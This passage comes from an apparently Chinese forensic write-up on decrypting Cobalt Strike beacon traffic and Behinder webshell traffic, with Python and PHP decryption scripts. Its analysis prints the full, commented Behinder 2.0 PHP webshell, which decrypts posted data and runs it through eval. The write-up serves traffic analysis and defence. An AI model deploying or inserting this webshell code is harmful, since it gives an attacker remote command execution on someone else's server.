x.items())),</span><br><span class="line">#             a.field_data.values(),</span><br><span class="line">#         )</span><br><span class="line">#     )</span><br><span class="line"># )</span><br></pre></td></tr></table></figure>

<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F937083a3-f15f-4fd6-8552-fc1207d3b145%2FUntitled.png?table=block&id=62302837-201f-4a65-bbb6-29858590c7cb&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<ol>
<li>通过私钥，解cs元数据（即cookie值）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">python test.py -f key</span><br><span class="line">import base64</span><br><span class="line">import hexdump</span><br><span class="line">import hashlib</span><br><span class="line">import argparse</span><br><span class="line">import javaobj.v2 as javaobj</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">def parse_arguments():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;-f&quot;, type=str, default=None, required=True,</span><br><span class="line">                        help=&quot;key&quot;)</span><br><span class="line">    return parser.parse_args()</span><br><span class="line"></span><br><span class="line">def get_RSA_PriKey(SerializeKeyPath):</span><br><span class="line">    with open(SerializeKeyPath, &quot;rb&quot;) as fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">        b&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span><br><span class="line">        + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, privateKey)))</span><br><span class="line">        + b&quot;-----END PRIVATE KEY-----&quot;</span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">        b&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span><br><span class="line">        + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, publicKey)))</span><br><span class="line">        + b&quot;-----END PUBLIC KEY-----&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    return publicKey, privateKey</span><br><span class="line"></span><br><span class="line">def create_PK_Cipher(privateKey):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // 8</span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    return cipher, n_bytes</span><br><span class="line"></span><br><span class="line">def private_decrypt(cipher_text, privateKey):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    return b&#x27;&#x27;.join(</span><br><span class="line">        cipher.decrypt(cipher_text[i : i + n_bytes], 0)</span><br><span class="line">        for i in range(0, len(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">def get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line">    </span><br><span class="line">    if not (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        print(&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;)</span><br><span class="line">        exit(-1)</span><br><span class="line">        </span><br><span class="line">    raw_aes_keys = plain_text[8:24]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:16]</span><br><span class="line">    hmac_key = digest[16:]</span><br><span class="line">    return aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line">    </span><br><span class="line">    rsa_cipher_text = &quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    print(f&quot;AES key: &#123;aes_key.hex()&#125;&quot;)</span><br><span class="line">    print(f&quot;HMAC key: &#123;hmac_key.hex()&#125;&quot;)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure>

<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fe1dcc772-54c8-4dbd-b34f-443fc200f34f%2FUntitled.png?table=block&id=cd090950-559c-46ee-9604-7df151ff3b6b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>然后通过这两个密钥解密发送的任务数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">Beacon任务执行结果解密</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import struct</span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def compare_mac(mac, mac_verif):</span><br><span class="line">        if mac == mac_verif:</span><br><span class="line">                return True</span><br><span class="line">        if len(mac) != len(mac_verif):</span><br><span class="line">                print</span><br><span class="line">                &quot;invalid MAC size&quot;</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">        result = 0</span><br><span class="line"></span><br><span class="line">        for x, y in zip(mac, mac_verif):</span><br><span class="line">                result |= x ^ y</span><br><span class="line"></span><br><span class="line">        return result == 0</span><br><span class="line"></span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):</span><br><span class="line">        if not compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=&quot;sha256&quot;).digest()[0:16], signature):</span><br><span class="line">                print(&quot;message authentication failed&quot;)</span><br><span class="line">                return</span><br><span class="line"></span><br><span class="line">        cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">        data = cypher.decrypt(encrypted_data)</span><br><span class="line">        return data</span><br><span class="line"></span><br><span class="line">#key源自Beacon_metadata_RSA_Decrypt.py</span><br><span class="line">SHARED_KEY = binascii.unhexlify(&quot;ef08974c0b06bd5127e04ceffe12597b&quot;)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;)</span><br><span class="line"></span><br><span class="line">encrypt_data=input()</span><br><span class="line">encrypt_data=base64.b64decode(encrypt_data)</span><br><span class="line"></span><br><span class="line">encrypt_data_length=encrypt_data[0:4]</span><br><span class="line"></span><br><span class="line">encrypt_data_length=int.from_bytes(encrypt_data_length, byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line"></span><br><span class="line">encrypt_data_l = encrypt_data[4:len(encrypt_data)]</span><br><span class="line"></span><br><span class="line">data1=encrypt_data_l[0:encrypt_data_length-16]</span><br><span class="line">signature=encrypt_data_l[encrypt_data_length-16:encrypt_data_length]</span><br><span class="line">iv_bytes = bytes(&quot;abcdefghijklmnop&quot;,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)</span><br><span class="line"></span><br><span class="line">counter = dec[0:4]</span><br><span class="line">counter=int.from_bytes(counter, byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">print(&quot;counter:&#123;&#125;&quot;.format(counter))</span><br><span class="line"></span><br><span class="line">dec_length = dec[4:8]</span><br><span class="line">dec_length=int.from_bytes(dec_length, byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">print(&quot;任务返回长度:&#123;&#125;&quot;.format(dec_length))</span><br><span class="line"></span><br><span class="line">de_data= dec[8:len(dec)]</span><br><span class="line">Task_type=de_data[0:4]</span><br><span class="line">Task_type=int.from_bytes(Task_type, byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">print(&quot;任务输出类型:&#123;&#125;&quot;.format(Task_type))</span><br><span class="line"></span><br><span class="line">print(de_data[4:dec_length])</span><br><span class="line"></span><br><span class="line">print(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure>

<p>encrypt_data的值为POST数据包中的data（还要将其进行一个base64编码）</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F4b3a7eb5-f0ec-4afa-b332-f395a28ee58c%2FUntitled.png?table=block&id=c316761d-4937-435c-90b4-b8e602df8870&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F60a400c3-e3f4-4934-a07a-c0d6a4712a02%2FUntitled.png?table=block&id=68e23719-0ebc-43ee-a2ba-9ebd9674e0e3&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<h2 id="冰蝎流量"><a href="#冰蝎流量" class="headerlink" title="冰蝎流量"></a>冰蝎流量</h2><h3 id="冰蝎php"><a href="#冰蝎php" class="headerlink" title="冰蝎php"></a>冰蝎php</h3><p>我在win7虚拟机中上传了一个冰蝎php马，并用主机对其执行命令，wireshark抓取vm8网卡</p>
<p><strong>流量特征：</strong></p>
<p>没什么特别强的特征</p>
<p>ua，content-type，content-length等等都有点弱特征</p>
<p>从做题本身角度来说，POST请求和返回包都是AES后的base64</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F50273e62-b5fd-4f32-8d7c-e5c00cf50f86%2FUntitled.png?table=block&id=f42b275e-3cac-4668-83b8-6149a5755736&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>冰蝎2.0加密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;]))</span><br><span class="line">  //这里如果接收到get请求的pass参数</span><br><span class="line">&#123;</span><br><span class="line">    $key=substr(md5(uniqid(rand())),16);</span><br><span class="line">  //生成16位的随机秘钥用md5加密</span><br><span class="line">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class="line">  //将上方生成的KEY存储到SEESSION中</span><br><span class="line">    print $key;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">  //如果没接收到pass参数，利用存储的KEY进行解密</span><br><span class="line">&#123;</span><br><span class="line">    $key=$_SESSION[&#x27;k&#x27;];</span><br><span class="line">  //接收执行的命令</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	//检查是否加载了openssl拓展</span><br><span class="line">	if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line">	//使用循环遍历$post字符串的每个字符，并与$key数组中对应位置的字符进行异或运算。</span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">    //使用oppenssl进行AES128加密(这里要注意他用的AES128解密的时候也需要用这个)</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">  //将解密后的$post以&#x27;|&#x27;分割为数组。</span><br><span class="line">    $arr=explode(&#x27;|&#x27;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">  //创建C类，利用__construct中的eval来执行解密后的值</span><br><span class="line">	@new C($params);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>冰蝎3.0加密脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对比可知，整体加密逻辑基本一致，只是key略有不同，冰蝎2的key是随机生成的，冰蝎3的key是设定好的</p>
<p>加密逻辑整体比较简单，就是一个AES CBC然后base64</p>
<p>至于解密也是比较简单的，照着逻辑逆一下就行，主要需要得到key值，其中iv是全0填充</p>
<p><strong>解密</strong></p>
<p>请求包解密</p>
<p>由于我自己抓的包总感觉有点问题，接下来就用其他人的数据包进行分析</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F95db1fa9-9e88-4830-ab2c-7c8e9ceb0f47%2FUntitled.png?table=block&id=faa554d7-4983-4772-b4f0-f98ebe343a3b&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>里面内容再解一次base64</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2F0aee8829-ccad-47be-9f8e-58429066aae6%2FUntitled.png?table=block&id=aeab7193-4621-4e52-b081-da3f929a55b5&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>解出来的数据结尾即是命令执行的部分</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0e5b26199268430be82c4542843c1fb0.png?table=block&id=6c3c8f30-2826-449d-938f-58f475764632&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="123"></p>
<p><strong>返回包的解密</strong></p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F99ca4748-e076-48a6-b5b0-0b4a2f0d99da%2Fe1283605-d817-48f5-8ac9-1c258196c298%2FUntitled.png?table=block&id=2e9c199c-a39b-43e3-9438-4e7b88462bf3&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="Untitled"></p>
<p>第一部分解密同请求包</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F85e0781e4aad48e35360d55b8d1406e3.png?table=block&id=6e8dbb07-d4e8-4344-968d-0812be0510d4&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="123"></p>
<p>status是状态</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F9e363a8bf7f09d3398dd36a72d3a96c7.png?table=block&id=0bc22119-354e-48d7-b86c-24b396116e3c&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="123"></p>
<p>message即是命令执行的结果</p>
<p><img src="https://powerful-syringa-e08.notion.site/image/https%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F0cc3d0fc929f0afa19c1b73c2f982090.png?table=block&id=b6832c56-1202-45f6-b4f1-70af6cf3bf56&spaceId=99ca4748-e076-48a6-b5b0-0b4a2f0d99da&width=1530&userId=&cache=v2" alt="img"></p>
<p><strong>脚本解密</strong>（这个对我的数据包能够解密，有点神奇，目录为”D:\tools\behinder_decrypt-master\decropt.php”，该脚本目前只支持php马的解密）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = getopt(&#x27;a:k:f:t:d:&#x27;);</span><br><span class="line">echo &quot;进入php文件\n\n\n\n\n&quot;;</span><br><span class="line">// exit();</span><br><span class="line">// echo &quot;进行php 脚本中&quot;;</span><br><span class="line">// try &#123;</span><br><span class="line">//     $key = $arr[&#x27;k&#x27;];</span><br><span class="line">// &#125; catch (\Throwable $e) &#123;</span><br><span class="line">//     //日志方法，具体自己实现</span><br><span class="line">//     $key=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">//  &#125;</span><br><span class="line">isset($arr[&#x27;k&#x27;])?$key=$arr[&#x27;k&#x27;]:$key=&#x27;e45e329feb5d925b&#x27;;</span><br><span class="line">isset($arr[&#x27;t&#x27;])?$http_type=$arr[&#x27;t&#x27;]:$http_type=&#x27;requests&#x27;;</span><br><span class="line">// echo &quot;this is \$key:&quot;.$key.&quot;\n this is \$http_type:&quot;.$http_type;</span><br><span class="line">// echo &quot;\$post is :&quot;.$post.&quot;\n\n&quot;;</span><br><span class="line">if (isset($arr[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $file=$arr[&#x27;f&#x27;];</span><br><span class="line">    $post_raw = file_get_contents($file);</span><br><span class="line">    if(isset($arr[&#x27;d&#x27;]))&#123;</span><br><span class="line">        $arr[&#x27;d&#x27;] = &#x27;t&#x27;;</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if (isset($arr[&#x27;a&#x27;]))&#123;</span><br><span class="line">        $post_raw= $arr[&#x27;a&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function aes_convert_str($post_raw,$key)&#123;</span><br><span class="line">    // preg_match(&#x27;//&#x27;);</span><br><span class="line">    preg_match(&#x27;/[a-zA-Z0-9\+\=\/]&#123;24,&#125;/i&#x27;,$post_raw,$post);</span><br><span class="line">    // echo &quot;\$post is :&quot;.$post[0];</span><br><span class="line">    // echo &quot;aes的数据为：&quot;;</span><br><span class="line">    if (count($post) === 0)&#123;</span><br><span class="line">        return &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    // echo &quot;进入intoaes函数：&quot;.$post[0];</span><br><span class="line">    if (count($post) === 0)&#123;</span><br><span class="line">        return &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        $post=openssl_decrypt($post[0], &quot;AES128&quot;, $key);</span><br><span class="line">    &#125; catch (\Throwable $e) &#123;</span><br><span class="line">        //日志方法，具体自己实现</span><br><span class="line">        // CoreHelper::write(json_encode([&#x27;eventName&#x27;,&#x27;order_id&#x27;=&gt;$order-&gt;order_id??&#x27;&#x27;,$e-&gt;getMessage()], JSON_UNESCAPED_UNICODE));</span><br><span class="line">        return &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // var_dump($post);</span><br><span class="line">    if ($post == &#x27;&#x27;)&#123;</span><br><span class="line">        return &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $post;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function xor_convert_str($post_raw,$key,$http_type)&#123;</span><br><span class="line">    // echo &quot;进入intoxor函数1,raw_data is :&quot;.$post_raw.&quot;xixixi\n\n\n\n\n\n\n&quot;;</span><br><span class="line">    if ($http_type == &#x27;requests&#x27;)&#123;</span><br><span class="line">        // echo &quot;this is :&quot;.$http_type.&quot;\n&quot;;</span><br><span class="line">        $t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">        $post=$t($post_raw.&quot;&quot;);</span><br><span class="line">        $post_raw = $post;</span><br><span class="line">        // echo &quot;this is \033[[95mrequests\033[[1m&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    // echo &quot;thisresponse&quot;;</span><br><span class="line">    $post = $post_raw;</span><br><span class="line">    $pattern = &#x27;&lt;b&gt;Warning&lt;/b&gt;:  session_start(): Cannot send session cache limiter - headers already sent in &lt;b&gt;D:\phpstudy_pro\WWW\sqli-labs\shell.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span><br><span class="line">    // $pattern = &#x27;on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;&#x27;;</span><br><span class="line">    // echo &quot;hereis\$post&quot;.$post.&quot;\n\n\n\n&quot;;</span><br><span class="line">    // var_dump(strpos($post,$pattern));</span><br><span class="line">    if(strpos($post,$pattern) != false)&#123;</span><br><span class="line">        $result = substr($post,strpos($post,$pattern)+strlen($pattern)+1);</span><br><span class="line">        // echo &quot;thatshouldberesult&quot;.$result.&quot;tty&quot;;</span><br><span class="line">        if($result != &#x27;&#x27;)&#123;</span><br><span class="line">            $post = $result;</span><br><span class="line">            // echo &quot;intotheconvert&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">        $post[$i] = $post[$i]^$key[$i+1&amp;15];</span><br><span class="line">    &#125;</span><br><span class="line">    // echo &quot;进入intoxor函数2&quot;.$post.&quot;xixixi&quot;;</span><br><span class="line">    // echo &quot;this is \$post:&quot;.$post;</span><br><span class="line">    return $post;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$post = aes_convert_str($post_raw,$key);</span><br><span class="line">// echo &quot;aes函数complate&quot;.$post.&quot;\n&quot;;</span><br><span class="line">$post === &#x27;no&#x27;?$post = 